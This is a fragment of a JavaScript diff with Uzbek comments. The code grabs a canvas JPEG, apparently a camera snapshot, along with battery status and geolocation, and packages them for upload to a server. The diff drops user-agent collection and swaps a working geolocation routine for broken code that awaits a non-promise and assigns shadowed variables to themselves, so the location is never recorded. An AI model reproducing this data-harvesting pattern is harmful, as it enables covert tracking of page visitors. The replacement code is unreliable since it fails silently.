@@ -253,9 +253,6 @@
           canvas.toBlob(res, "image/jpeg")
         );
 
-        const userAgent = navigator.userAgent;
-        const platform = navigator.platform;
-
         let batteryLevel = "unknown";
         let batteryCharging = "unknown";
         try {
@@ -266,20 +263,14 @@
 
         let latitude = "Nomalum";
         let longitude = "Nomalum";
-
-        // 📍 Joylashuvni olish
-        if (navigator.geolocation) {
-          await new Promise((resolve) => {
-            navigator.geolocation.getCurrentPosition(
-              (pos) => {
-                latitude = pos.coords.latitude;
-                longitude = pos.coords.longitude;
-                resolve();
-              },
-              () => resolve() // agar rad etsa, davom etadi
-            );
-          });
-        }
+        try {
+          const location = await navigator.geolocation.getCurrentPosition(
+            ({ coords: { latitude, longitude } }) => {
+              latitude = latitude;
+              longitude = longitude;
+            }
+          );
+        } catch (e) {}
 
         // 📨 Serverga yuborish
         const formData = new FormData();
